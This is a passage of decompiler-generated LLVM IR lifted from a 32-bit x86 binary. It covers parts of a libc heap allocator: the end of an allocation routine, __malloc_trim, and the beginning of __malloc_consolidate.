dec_label_pc_804a507:                             ; preds = %dec_label_pc_804a494
  %v10_804a507 = icmp eq i32 %v0_804a50799, -1
  br i1 %v10_804a507, label %dec_label_pc_804a512, label %dec_label_pc_804a50c

dec_label_pc_804a50c:                             ; preds = %dec_label_pc_804a507
  store i32 %v0_804a50c100, i32* @ebp, align 4
  br label %dec_label_pc_804a50e

dec_label_pc_804a50e:                             ; preds = %dec_label_pc_804a4fc, %dec_label_pc_804a50c
  %v0_804a52a59 = phi i32 [ %v0_804a503, %dec_label_pc_804a4fc ], [ %v0_804a50799, %dec_label_pc_804a50c ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804a52a

dec_label_pc_804a512:                             ; preds = %dec_label_pc_804a507
  store i32 0, i32* %stack_var_-72, align 4
  %v1_804a514 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804a514, i32* %edx.global-to-local, align 4
  %v1_804a51b = load i32, i32* @ebx, align 4
  %v2_804a51b = sub i32 %v1_804a514, %v1_804a51b
  %v1_804a51d = load i32, i32* @edi, align 4
  %v2_804a51d = sub i32 %v2_804a51b, %v1_804a51d
  store i32 %v2_804a51d, i32* %eax.global-to-local, align 4
  %v0_804a51f = load i32, i32* @global_var_8055b78.49, align 8
  %v2_804a51f = add i32 %v0_804a51f, %v2_804a51d
  store i32 %v2_804a51f, i32* @global_var_8055b78.49, align 8
  store i32 %v1_804a51b, i32* @ebp, align 4
  br label %dec_label_pc_804a527

dec_label_pc_804a527:                             ; preds = %dec_label_pc_804a4eb, %dec_label_pc_804a512
  %v0_804a52a58 = phi i32 [ %v1_804a4ed, %dec_label_pc_804a4eb ], [ %v1_804a514, %dec_label_pc_804a512 ]
  store i32 0, i32* @esi, align 4
  %v2_804a529 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_804a529, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a52a

dec_label_pc_804a52a:                             ; preds = %dec_label_pc_804a4f6, %dec_label_pc_804a50e, %dec_label_pc_804a527
  %v0_804a535 = phi i32 [ %v1_804a4e0, %dec_label_pc_804a4f6 ], [ %v0_804a52a59, %dec_label_pc_804a50e ], [ %v0_804a52a58, %dec_label_pc_804a527 ]
  %v10_804a52a = icmp eq i32 %v0_804a535, -1
  br i1 %v10_804a52a, label %dec_label_pc_804a59c, label %dec_label_pc_804a52f

dec_label_pc_804a52f:                             ; preds = %dec_label_pc_804a52a
  %v0_804a52f = load i32, i32* @ebp, align 4
  store i32 %v0_804a52f, i32* @global_var_805583c.36, align 4
  %v1_804a535 = load i32, i32* @esi, align 4
  %v2_804a535 = sub i32 %v0_804a535, %v0_804a52f
  %v2_804a538 = add i32 %v2_804a535, %v1_804a535
  %v1_804a53a = or i32 %v2_804a538, 1
  store i32 %v1_804a53a, i32* %eax.global-to-local, align 4
  %v2_804a53d = add i32 %v0_804a52f, 4
  %v3_804a53d = inttoptr i32 %v2_804a53d to i32*
  store i32 %v1_804a53a, i32* %v3_804a53d, align 4
  %v0_804a540 = load i32, i32* @global_var_8055b78.49, align 8
  %v1_804a540 = load i32, i32* @esi, align 4
  %v2_804a540 = add i32 %v1_804a540, %v0_804a540
  store i32 %v2_804a540, i32* @global_var_8055b78.49, align 8
  br i1 %v2_804a3a1, label %dec_label_pc_804a59c, label %dec_label_pc_804a54d

dec_label_pc_804a54d:                             ; preds = %dec_label_pc_804a52f
  %v1_804a551 = add i32 %v1_804a3a1, -12
  %v1_804a554 = and i32 %v1_804a551, -8
  store i32 %v1_804a554, i32* %eax.global-to-local, align 4
  %v1_804a559 = or i32 %v1_804a554, 1
  store i32 %v1_804a559, i32* %edx.global-to-local, align 4
  store i32 %v0_804a394, i32* %ebx.global-to-local, align 4
  store i32 %v1_804a559, i32* %v2_804a39e, align 4
  %v0_804a563 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a563 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a563 = add i32 %v0_804a563, 4
  %v3_804a563 = add i32 %v2_804a563, %v1_804a563
  %v4_804a563 = inttoptr i32 %v3_804a563 to i32*
  store i32 5, i32* %v4_804a563, align 4
  %v0_804a56b = load i32, i32* %eax.global-to-local, align 4
  %v1_804a56b = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a56b = add i32 %v0_804a56b, 8
  %v3_804a56b = add i32 %v2_804a56b, %v1_804a56b
  %v4_804a56b = inttoptr i32 %v3_804a56b to i32*
  store i32 5, i32* %v4_804a56b, align 4
  %v0_804a573 = load i32, i32* %eax.global-to-local, align 4
  %tmp148 = icmp ult i32 %v0_804a573, 16
  br i1 %tmp148, label %dec_label_pc_804a59c, label %dec_label_pc_804a578

dec_label_pc_804a578:                             ; preds = %dec_label_pc_804a54d
  %v0_804a578 = load i32, i32* @global_var_8055b54.53, align 4
  store i32 %v0_804a578, i32* @ebx, align 4
  store i32 -1, i32* @global_var_8055b54.53, align 4
  %v1_804a58c = add i32 %v0_804a394, 8
  store i32 %v1_804a58c, i32* %eax.global-to-local, align 4
  store i32 %v1_804a58c, i32* %stack_var_-72, align 4
  %v1_804a590 = call i32 @free(i32 %v1_804a58c)
  store i32 %v1_804a590, i32* %eax.global-to-local, align 4
  %v0_804a595 = load i32, i32* @ebx, align 4
  store i32 %v0_804a595, i32* @global_var_8055b54.53, align 4
  %v2_804a59b = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_804a59b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804a59c

dec_label_pc_804a59c:                             ; preds = %dec_label_pc_804a54d, %dec_label_pc_804a52f, %dec_label_pc_804a52a, %dec_label_pc_804a462, %dec_label_pc_804a578
  %v0_804a59c = load i32, i32* @global_var_8055b78.49, align 8
  store i32 %v0_804a59c, i32* %eax.global-to-local, align 4
  %v1_804a5a1 = load i32, i32* @global_var_8055b7c.54, align 4
  %tmp149 = icmp ugt i32 %v0_804a59c, %v1_804a5a1
  br i1 %tmp149, label %dec_label_pc_804a5a9, label %dec_label_pc_804a5ae

dec_label_pc_804a5a9:                             ; preds = %dec_label_pc_804a59c
  store i32 %v0_804a59c, i32* @global_var_8055b7c.54, align 4
  br label %dec_label_pc_804a5ae

dec_label_pc_804a5ae:                             ; preds = %dec_label_pc_804a59c, %dec_label_pc_804a5a9
  %v1_804a5ae = load i32, i32* @global_var_8055b74.47, align 4
  %v2_804a5ae = add i32 %v1_804a5ae, %v0_804a59c
  store i32 %v2_804a5ae, i32* %eax.global-to-local, align 4
  %v1_804a5b4 = load i32, i32* @global_var_8055b84.50, align 4
  %tmp150 = icmp ugt i32 %v2_804a5ae, %v1_804a5b4
  br i1 %tmp150, label %dec_label_pc_804a5bc, label %dec_label_pc_804a5c1

dec_label_pc_804a5bc:                             ; preds = %dec_label_pc_804a5ae
  store i32 %v2_804a5ae, i32* @global_var_8055b84.50, align 4
  br label %dec_label_pc_804a5c1

dec_label_pc_804a5c1:                             ; preds = %dec_label_pc_804a5ae, %dec_label_pc_804a5bc
  %v0_804a5c1 = load i32, i32* @global_var_805583c.36, align 4
  store i32 %v0_804a5c1, i32* %ebx.global-to-local, align 4
  %v1_804a5c7 = add i32 %v0_804a5c1, 4
  %v2_804a5c7 = inttoptr i32 %v1_804a5c7 to i32*
  %v3_804a5c7 = load i32, i32* %v2_804a5c7, align 4
  %v1_804a5ca = and i32 %v3_804a5c7, -4
  store i32 %v1_804a5ca, i32* @ecx, align 4
  %v10_804a5cd = icmp ult i32 %v1_804a5ca, %v1_804a26c
  br i1 %v10_804a5cd, label %dec_label_pc_804a5f5, label %dec_label_pc_804a5d3

dec_label_pc_804a5d3:                             ; preds = %dec_label_pc_804a5c1
  %v2_804a5d7 = add i32 %v0_804a5c1, %v1_804a2f1
  store i32 %v2_804a5d7, i32* %edx.global-to-local, align 4
  store i32 %v2_804a5d7, i32* @global_var_805583c.36, align 4
  %v1_804a5e0 = or i32 %v1_804a2f1, 1
  store i32 %v1_804a5e0, i32* %v2_804a5c7, align 4
  %v0_804a5e6 = load i32, i32* @ecx, align 4
  %v5_804a5e6 = sub i32 %v0_804a5e6, %v1_804a2f1
  %v1_804a5ea = or i32 %v5_804a5e6, 1
  store i32 %v1_804a5ea, i32* @ecx, align 4
  %v1_804a5ed = load i32, i32* %edx.global-to-local, align 4
  %v2_804a5ed = add i32 %v1_804a5ed, 4
  %v3_804a5ed = inttoptr i32 %v2_804a5ed to i32*
  store i32 %v1_804a5ea, i32* %v3_804a5ed, align 4
  %v0_804a5f0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a5f0 = add i32 %v0_804a5f0, 8
  store i32 %v1_804a5f0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a602

dec_label_pc_804a5f5:                             ; preds = %dec_label_pc_804a442.thread101, %dec_label_pc_804a40f, %dec_label_pc_804a5c1
  %v0_804a5f5 = load i32, i32* %stack_var_-72, align 4
  %v1_804a5f5 = call i32 @__GI___errno_location(i32 %v0_804a5f5)
  %v1_804a5fa = inttoptr i32 %v1_804a5f5 to i32*
  store i32 12, i32* %v1_804a5fa, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a602

dec_label_pc_804a602:                             ; preds = %dec_label_pc_804a5d3, %dec_label_pc_804a38c, %dec_label_pc_804a2ab, %dec_label_pc_804a5f5
  %v0_804a602 = phi i32 [ %v1_804a5f0, %dec_label_pc_804a5d3 ], [ %v1_804a38c, %dec_label_pc_804a38c ], [ %v1_804a2bd, %dec_label_pc_804a2ab ], [ 0, %dec_label_pc_804a5f5 ]
  store i32 %v0_804a602, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a604

dec_label_pc_804a604:                             ; preds = %dec_label_pc_804a294, %dec_label_pc_804a170, %dec_label_pc_8049f6c, %dec_label_pc_804a602
  store i32 1, i32* %stack_var_-72, align 4
  store i32 %v2_8049eab, i32* %eax.global-to-local, align 4
  %v3_804a60b = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v2_8049eab, i32* %eax.global-to-local, align 4
  %v2_804a611 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_804a611, i32* @edx, align 4
  %v0_804a612.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a612

dec_label_pc_804a612:                             ; preds = %dec_label_pc_8049ec7, %dec_label_pc_804a604
  %v0_804a612 = phi i32 [ 0, %dec_label_pc_8049ec7 ], [ %v0_804a612.pre, %dec_label_pc_804a604 ]
  store i32 %v0_804a612, i32* %eax.global-to-local, align 4
  %v2_804a617 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804a617, i32* @ebx, align 4
  store i32 %v0_8049e98, i32* @esi, align 4
  store i32 %v0_8049e97, i32* @edi, align 4
  store i32 %v0_8049e96, i32* @ebp, align 4
  ret i32 %v0_804a612

; uselistorder directives
  uselistorder i32 %v0_804a612, { 1, 0 }
  uselistorder i32 %v2_804a5ae, { 1, 0, 2 }
  uselistorder i32 %v0_804a59c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804a52f, { 1, 0, 2 }
  uselistorder i32 %v2_804a51d, { 1, 0 }
  uselistorder i32 %v1_804a4e0, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_804a4dc, { 2, 1, 0 }
  uselistorder i32 %v2_804a4cc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804a4c0, { 1, 0, 2 }
  uselistorder i32 %v1_804a4b0, { 2, 1, 0 }
  uselistorder i8 %v0_804a478, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v5_804a44f, { 1, 0, 2 }
  uselistorder i32 %v0_804a50799, { 2, 0, 1 }
  uselistorder i32 %v0_804a50c100, { 3, 1, 2, 4, 0, 6, 5 }
  uselistorder i32 %v1_804a453, { 2, 1, 0 }
  uselistorder i32 %v6_804a424, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804a421, { 1, 0 }
  uselistorder i32 %v0_804a402, { 1, 0 }
  uselistorder i32 %v2_804a3d4, { 1, 0, 2, 3, 4 }
  uselistorder i8 %v0_804a3b6, { 1, 0 }
  uselistorder i32 %v1_804a3a1, { 7, 0, 6, 1, 5, 2, 3, 4, 8 }
  uselistorder i32* %v2_804a39e, { 1, 0, 2 }
  uselistorder i32 %v0_804a394, { 4, 3, 5, 0, 2, 1 }
  uselistorder i32 %v2_804a379, { 1, 0, 2 }
  uselistorder i32 %v2_804a361, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_804a32b, { 1, 0, 2 }
  uselistorder i32 %v1_804a321, { 2, 1, 0 }
  uselistorder i32 %v6_804a310, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_804a2f9, { 1, 0, 2 }
  uselistorder i32 %v0_804a29c, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_804a26c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804a25c, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_804a254, { 1, 0 }
  uselistorder i32 %v1_804a1e9, { 1, 0 }
  uselistorder i32 %v1_804a1de, { 1, 0 }
  uselistorder i32 %v2_804a1cf, { 3, 2, 1, 0 }
  uselistorder i32 %edi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_804a1cc17, { 1, 0 }
  uselistorder i32 %v2_804a1bc, { 1, 0 }
  uselistorder i32 %v1_804a1a5, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804a1a1, { 1, 2, 0 }
  uselistorder i32 %v1_804a19d, { 1, 0 }
  uselistorder i32 %v1_804a193, { 2, 1, 0 }
  uselistorder i32 %v2_804a189, { 1, 0 }
  uselistorder i32 %v1_804a17d, { 1, 0, 2, 3 }
  uselistorder i32 %v4_804a115, { 3, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 %v0_804a16d, { 1, 0 }
  uselistorder i32 %v3_804a108, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804a0ce.lcssa, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804a0ce118, { 0, 2, 1 }
  uselistorder i32 %v1_804a0c7, { 1, 0 }
  uselistorder i32 %v0_804a0ce, { 0, 2, 1 }
  uselistorder i32 %v1_804a09b, { 2, 1, 0 }
  uselistorder i32 %v2_804a098, { 1, 0 }
  uselistorder i32 %v0_804a09b, { 1, 0 }
  uselistorder i32 %v3_804a088, { 0, 2, 3, 1 }
  uselistorder i32 %v1_804a083, { 1, 0, 2 }
  uselistorder i32 %v2_804a05d, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v2_804a042, { 1, 0 }
  uselistorder i32 %v0_804a01e, { 2, 0, 3, 1 }
  uselistorder i32 %v0_804a00b, { 1, 0 }
  uselistorder i32 %v3_8049f9c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804a0ce121, { 6, 0, 2, 1, 7, 3, 4, 5 }
  uselistorder i32 %v3_8049f4f, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8049f45, { 1, 0 }
  uselistorder i32 %v2_8049f1d, { 1, 0 }
  uselistorder i8 %v0_8049ef0, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_804a2f1, { 20, 21, 2, 11, 10, 3, 23, 22, 19, 17, 18, 4, 24, 25, 5, 26, 27, 14, 6, 15, 16, 31, 7, 30, 9, 28, 8, 29, 32, 12, 13, 0, 34, 33, 1, 35 }
  uselistorder i32 %v1_8049ed9, { 0, 2, 1 }
  uselistorder i32 %v0_8049ec2, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %stack_var_-84, { 1, 2, 0, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15, 17, 18, 16, 19, 22, 20, 21, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 48, 39, 40, 41, 42, 43, 44, 46, 45, 47 }
  uselistorder i32* %ebx.global-to-local, { 23, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 16, 14, 0, 15, 17, 18, 19, 20, 21, 32, 33, 22, 29, 30, 31, 34, 24, 25, 26, 27, 28 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 52, 48, 50, 51, 49, 53, 54, 55, 56, 57, 58, 77, 78, 79, 59, 60, 64, 61, 62, 63, 65, 66, 67, 68, 69, 70, 71, 72, 0, 73, 76, 74, 75 }
  uselistorder i8* @global_var_8055b70.52, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134568004, { 0, 2, 3, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805583c.36 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805583c.36 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_804a612, { 1, 0 }
  uselistorder label %dec_label_pc_804a604, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804a602, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804a5f5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a5c1, { 1, 0 }
  uselistorder label %dec_label_pc_804a5ae, { 1, 0 }
  uselistorder label %dec_label_pc_804a59c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804a52a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804a527, { 1, 0 }
  uselistorder label %dec_label_pc_804a50e, { 1, 0 }
  uselistorder label %dec_label_pc_804a4c5, { 1, 0 }
  uselistorder label %dec_label_pc_804a4ae, { 1, 0 }
  uselistorder label %dec_label_pc_804a494, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804a40f, { 1, 0 }
  uselistorder label %dec_label_pc_804a402, { 1, 0 }
  uselistorder label %dec_label_pc_804a3c3, { 1, 0 }
  uselistorder label %dec_label_pc_804a394, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804a38c, { 1, 0 }
  uselistorder label %dec_label_pc_804a379, { 1, 0 }
  uselistorder label %dec_label_pc_804a35f, { 1, 0 }
  uselistorder label %dec_label_pc_804a341, { 1, 0 }
  uselistorder label %dec_label_pc_804a294, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804a25c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804a240, { 1, 0 }
  uselistorder label %dec_label_pc_804a1cc, { 1, 0 }
  uselistorder label %dec_label_pc_804a1d1.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804a1a5, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804a17d, { 1, 0 }
  uselistorder label %dec_label_pc_804a170, { 1, 0 }
  uselistorder label %dec_label_pc_804a11f, { 1, 0 }
  uselistorder label %dec_label_pc_804a0e4, { 1, 0 }
  uselistorder label %dec_label_pc_804a0c3, { 2, 0, 1 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %dec_label_pc_804a096, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804a088, { 1, 0 }
  uselistorder label %dec_label_pc_8049f6c, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8049ef0, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_804a623 = load i32, i32* @edx, align 4
  store i32 %v0_804a623, i32* %ebp.global-to-local, align 4
  %v1_804a625 = add i32 %v0_804a623, 860
  %v2_804a625 = inttoptr i32 %v1_804a625 to i32*
  %v3_804a625 = load i32, i32* %v2_804a625, align 4
  store i32 %v3_804a625, i32* @ecx, align 4
  %v1_804a62b = add i32 %v0_804a623, 44
  %v2_804a62b = inttoptr i32 %v1_804a62b to i32*
  %v3_804a62b = load i32, i32* %v2_804a62b, align 4
  %v1_804a62e = add i32 %v3_804a62b, 4
  %v2_804a62e = inttoptr i32 %v1_804a62e to i32*
  %v3_804a62e = load i32, i32* %v2_804a62e, align 4
  %v1_804a631 = and i32 %v3_804a62e, -4
  store i32 %v1_804a631, i32* @esi, align 4
  %v1_804a638 = load i32, i32* @eax, align 4
  %v2_804a634 = add i32 %v3_804a625, -17
  %v3_804a634 = add i32 %v2_804a634, %v1_804a631
  %v2_804a638 = sub i32 %v3_804a634, %v1_804a638
  %div = udiv i32 %v2_804a638, %v3_804a625
  %v1_804a642 = add i32 %div, -1
  %v4_804a643 = mul i32 %v1_804a642, %v3_804a625
  store i32 %v4_804a643, i32* @ebx, align 4
  %tmp9 = icmp slt i32 %v4_804a643, 1
  br i1 %tmp9, label %dec_label_pc_804a691, label %dec_label_pc_804a64a

dec_label_pc_804a64a:                             ; preds = %entry
  %v1_804a64c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804a64c, i32* %edi.global-to-local, align 4
  %v0_804a653 = load i32, i32* @esi, align 4
  %v1_804a655 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804a655 = add i32 %v1_804a655, 44
  %v3_804a655 = inttoptr i32 %v2_804a655 to i32*
  %v4_804a655 = load i32, i32* %v3_804a655, align 4
  %v5_804a655 = add i32 %v4_804a655, %v0_804a653
  %v12_804a659 = icmp eq i32 %v1_804a64c, %v5_804a655
  %v1_804a65b = icmp eq i1 %v12_804a659, false
  br i1 %v1_804a65b, label %dec_label_pc_804a691, label %dec_label_pc_804a65d

dec_label_pc_804a65d:                             ; preds = %dec_label_pc_804a64a
  %v1_804a65d = sub i32 0, %v4_804a643
  store i32 %v1_804a65d, i32* @ebx, align 4
  %v1_804a660 = call i32 @__GI_sbrk(i32 %v1_804a65d)
  %v1_804a667 = call i32 @__GI_sbrk(i32 0)
  store i32 0, i32* @ecx, align 4
  %v10_804a66e = icmp eq i32 %v1_804a667, -1
  br i1 %v10_804a66e, label %dec_label_pc_804a691, label %dec_label_pc_804a673

dec_label_pc_804a673:                             ; preds = %dec_label_pc_804a65d
  %v0_804a673 = load i32, i32* %edi.global-to-local, align 4
  %v2_804a675 = sub i32 %v0_804a673, %v1_804a667
  %v12_804a675 = icmp eq i32 %v2_804a675, 0
  store i32 %v2_804a675, i32* @ecx, align 4
  br i1 %v12_804a675, label %dec_label_pc_804a691, label %dec_label_pc_804a679

dec_label_pc_804a679:                             ; preds = %dec_label_pc_804a673
  %v0_804a679 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804a679 = add i32 %v0_804a679, 872
  %v2_804a679 = inttoptr i32 %v1_804a679 to i32*
  %v3_804a679 = load i32, i32* %v2_804a679, align 4
  %v5_804a679 = sub i32 %v3_804a679, %v2_804a675
  store i32 %v5_804a679, i32* %v2_804a679, align 4
  %v0_804a67f = load i32, i32* %ebp.global-to-local, align 4
  %v1_804a67f = add i32 %v0_804a67f, 44
  %v2_804a67f = inttoptr i32 %v1_804a67f to i32*
  %v3_804a67f = load i32, i32* %v2_804a67f, align 4
  %v0_804a682 = load i32, i32* @esi, align 4
  %v1_804a682 = load i32, i32* @ecx, align 4
  %v2_804a682 = sub i32 %v0_804a682, %v1_804a682
  %v1_804a684 = or i32 %v2_804a682, 1
  %v2_804a687 = add i32 %v3_804a67f, 4
  %v3_804a687 = inttoptr i32 %v2_804a687 to i32*
  store i32 %v1_804a684, i32* %v3_804a687, align 4
  br label %dec_label_pc_804a693

dec_label_pc_804a691:                             ; preds = %dec_label_pc_804a673, %dec_label_pc_804a65d, %dec_label_pc_804a64a, %entry
  br label %dec_label_pc_804a693

dec_label_pc_804a693:                             ; preds = %dec_label_pc_804a679, %dec_label_pc_804a691
  %storemerge = phi i32 [ 1, %dec_label_pc_804a679 ], [ 0, %dec_label_pc_804a691 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804a667, { 1, 0 }
  uselistorder i32 %v4_804a643, { 1, 2, 0 }
  uselistorder i32 %v3_804a625, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804a693, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp15 = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_804a699 = load i32, i32* @ebp, align 4
  %v0_804a69b = load i32, i32* @esi, align 4
  %v0_804a69c = load i32, i32* @ebx, align 4
  store i32 %tmp15, i32* @ebp, align 4
  %v2_804a6a4 = load i32, i32* %arg1, align 4
  store i32 %v2_804a6a4, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804a6ac = icmp eq i32 %v2_804a6a4, 0
  br i1 %v1_804a6ac, label %dec_label_pc_804a7ad, label %dec_label_pc_804a6b4

dec_label_pc_804a6b4:                             ; preds = %entry
  %v1_804a6b4 = and i32 %v2_804a6a4, -3
  store i32 %v1_804a6b4, i32* %eax.global-to-local, align 4
  store i32 %v1_804a6b4, i32* %arg1, align 4
  %v0_804a6ba = load i32, i32* @ebp, align 4
  %v1_804a6ba = add i32 %v0_804a6ba, 52
  store i32 %v1_804a6ba, i32* %edx.global-to-local, align 4
  %v2_804a6c1 = udiv i32 %v1_804a6b4, 8
  %v2_804a6c4 = mul nuw i32 %v2_804a6c1, 4
  %v3_804a6c4 = add i32 %v0_804a6ba, -4
  %v4_804a6c4 = add i32 %v3_804a6c4, %v2_804a6c4
  store i32 %v4_804a6c4, i32* %eax.global-to-local, align 4
  %v1_804a6cc = add i32 %v0_804a6ba, 4
  store i32 %v1_804a6cc, i32* %ebx.global-to-local, align 4
  %v1_804a765 = add i32 %v0_804a6ba, 60
  %v2_804a765 = inttoptr i32 %v1_804a765 to i32*
  br label %dec_label_pc_804a6d3

dec_label_pc_804a6d3:                             ; preds = %dec_label_pc_804a7a3, %dec_label_pc_804a6b4
  %v0_804a6e1 = phi i32 [ %v4_804a7a3, %dec_label_pc_804a7a3 ], [ %v1_804a6cc, %dec_label_pc_804a6b4 ]
  store i32 %v0_804a6e1, i32* %eax.global-to-local, align 4
  %v1_804a6d7 = inttoptr i32 %v0_804a6e1 to i32*
  %v2_804a6d7 = load i32, i32* %v1_804a6d7, align 4
  store i32 %v2_804a6d7, i32* @ecx, align 4
  %v1_804a6d9 = icmp eq i32 %v2_804a6d7, 0
  br i1 %v1_804a6d9, label %dec_label_pc_804a799, label %dec_label_pc_804a6e1

dec_label_pc_804a6e1:                             ; preds = %dec_label_pc_804a6d3
  store i32 0, i32* %v1_804a6d7, align 4
  %v0_804a6e7.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804a6e7

dec_label_pc_804a6e7:                             ; preds = %dec_label_pc_804a78d, %dec_label_pc_804a6e1
  %v0_804a703 = phi i32 [ %v3_804a6e7, %dec_label_pc_804a78d ], [ %v0_804a6e7.pre, %dec_label_pc_804a6e1 ]
  %v1_804a6e7 = add i32 %v0_804a703, 8
  %v2_804a6e7 = inttoptr i32 %v1_804a6e7 to i32*
  %v3_804a6e7 = load i32, i32* %v2_804a6e7, align 4
  store i32 %v3_804a6e7, i32* %edx.global-to-local, align 4
  %v1_804a6ee = add i32 %v0_804a703, 4
  %v2_804a6ee = inttoptr i32 %v1_804a6ee to i32*
  %v3_804a6ee = load i32, i32* %v2_804a6ee, align 4
  store i32 %v3_804a6ee, i32* %eax.global-to-local, align 4
  %v1_804a6f3 = and i32 %v3_804a6ee, -2
  store i32 %v1_804a6f3, i32* %edi.global-to-local, align 4
  %v2_804a6f6 = add i32 %v1_804a6f3, %v0_804a703
  store i32 %v2_804a6f6, i32* %edx.global-to-local, align 4
  %v1_804a6f9 = add i32 %v2_804a6f6, 4
  %v2_804a6f9 = inttoptr i32 %v1_804a6f9 to i32*
  %v3_804a6f9 = load i32, i32* %v2_804a6f9, align 4
  store i32 %v3_804a6f9, i32* %ebx.global-to-local, align 4
  store i32 %v3_804a6f9, i32* %stack_var_-40, align 4
  %v2_804a6ff = urem i32 %v3_804a6ee, 2
  %v3_804a6ff = icmp eq i32 %v2_804a6ff, 0
  %v1_804a701 = icmp eq i1 %v3_804a6ff, false
  br i1 %v1_804a701, label %dec_label_pc_804a72b, label %dec_label_pc_804a703

dec_label_pc_804a703:                             ; preds = %dec_label_pc_804a6e7
  %v1_804a703 = inttoptr i32 %v0_804a703 to i32*
  %v2_804a703 = load i32, i32* %v1_804a703, align 4
  %v5_804a70b = sub i32 %v0_804a703, %v2_804a703
  store i32 %v5_804a70b, i32* %eax.global-to-local, align 4
  %v1_804a70f = add i32 %v5_804a70b, 8
  %v2_804a70f = inttoptr i32 %v1_804a70f to i32*
  %v3_804a70f = load i32, i32* %v2_804a70f, align 4
  store i32 %v3_804a70f, i32* @esi, align 4
  %v1_804a712 = add i32 %v5_804a70b, 12
  %v2_804a712 = inttoptr i32 %v1_804a712 to i32*
  %v3_804a712 = load i32, i32* %v2_804a712, align 4
  store i32 %v3_804a712, i32* @ebx, align 4
  %v1_804a715 = add i32 %v3_804a70f, 12
  %v2_804a715 = inttoptr i32 %v1_804a715 to i32*
  %v3_804a715 = load i32, i32* %v2_804a715, align 4
  store i32 %v3_804a715, i32* @ecx, align 4
  %v12_804a718 = icmp eq i32 %v3_804a715, %v5_804a70b
